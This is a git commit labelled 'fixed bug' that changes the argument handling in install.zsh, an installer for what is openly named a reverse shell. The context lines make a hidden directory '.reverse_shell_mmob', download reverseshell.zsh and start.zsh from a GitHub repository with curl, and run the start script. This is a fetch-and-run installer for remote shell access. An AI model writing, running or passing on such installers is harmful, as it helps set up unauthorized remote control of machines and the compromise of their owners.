26a2c469b84733a55fea4d47cfcb6ec36451ecf3
mmilunicmobile <62996888+mmilunicmobile@users.noreply.github.com>
2022-02-13 21:13:57 -0500

    fixed bug

--- install.zsh
+++ install.zsh
@@ -3,4 +3,4 @@ mkdir .reverse_shell_mmob
 cd .reverse_shell_mmob
 curl -o reverseshell.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/reverseshell.zsh
 curl -o start.zsh https://raw.githubusercontent.com/mmilunicmobile/reverseshell/main/start.zsh
-zsh start.zsh $0 $1
+zsh start.zsh $1 $2
